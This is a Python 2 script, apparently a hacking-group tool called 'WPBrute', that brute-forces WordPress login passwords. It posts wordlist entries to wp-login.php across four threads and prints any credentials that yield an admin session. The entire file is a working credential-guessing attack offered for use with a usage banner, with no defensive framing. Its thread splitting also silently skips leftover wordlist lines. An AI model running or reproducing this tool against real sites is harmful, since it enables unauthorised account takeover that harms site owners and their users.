#!/usr/bin/env python
# -*- coding: utf-8 -*-
from requests import post
from threading import Thread
from time import sleep
from os import system
from sys import argv, exit

bold = "\033[1m"
underline = "\033[4m"
green = "\033[92m"
blue = "\033[94m"
yellow = "\033[93m"
red = "\033[91m"
endcolor = "\033[0m"

def logo():
	system("clear")
	print bold+"\t\t\tWPBrute | Wordpress BruteForce"+endcolor
	print bold+"\t\t\t------------------------------"+endcolor
	print "\t\t\t--==[ {}Cyber Warrior Team{} ]==--".format(green,endcolor)
	print "\t\t\t--==[  {}Bug Researachers{}  ]==--".format(blue,endcolor)
	print "\t\t\t--==[      {}CoderLab{}      ]==--".format(yellow, endcolor)
	print bold+"\t\t\t------------------------------"+endcolor

def usage():
	print green+"How To Use?"+endcolor
	print '\t{} -url "http://site.com/wordpress/wp-login.php" -username "exitstars" -wordlist "wordlist.txt"'.format(argv[0])

def totalline(wordlistfile):
	for totalword, word in enumerate(open(wordlistfile)):
		totalword += 1
	return totalword

def trying(start, finish, url, username):
	for word in words[start:finish]:
		send(word.strip(), url, username)
		sleep(0.01)

def send(password, url, username):
	payload = {'log':username, 'pwd':password, 'wp-submit':'Log+In'}
	response = post(url, data=payload)
	if '<li id="wp-admin-bar-logout">' in response.text:
		print "{}Username{}: {} | {}Password{}: {}".format(bold+green,endcolor,username, bold+green, endcolor, password)
		exit(1)
	else:
		pass

def clean(url, username, wordlistfile):
	if totalline(wordlistfile) % 4 == 0:
		piece = totalline(wordlistfile)/4
		start = 0
		finish = piece
		for i in range(4):	
			Thread(target=trying, args=(start, finish, url, username)).start()
			start += piece
			finish += piece
	else:
		remainder = totalline(wordlistfile) % 4
		piece = totalline(wordlistfile)/4
		start = 0
		finish = piece
		for i in range(4):	
			Thread(target=trying, args=(start, finish, url, username)).start()
			start += piece
			finish += piece

if len(argv) == 7:
	logo()
	url, username, wordlistfile = argv[2], argv[4], argv[6]
	with open(wordlistfile) as wordlist:
		words = wordlist.readlines()
	print "~"*30
	print bold+yellow+"ExitStars and All CoderLab & Bug Researchers Team"+endcolor
	print "~"*30
	print bold+blue+"Checking Start..."+endcolor
	clean(url, username, wordlistfile)
else:
	logo()
	print "~"*30
	print bold+yellow+"ExitStars and All CoderLab & Bug Researchers Team"+endcolor
	print "~"*30
	usage()
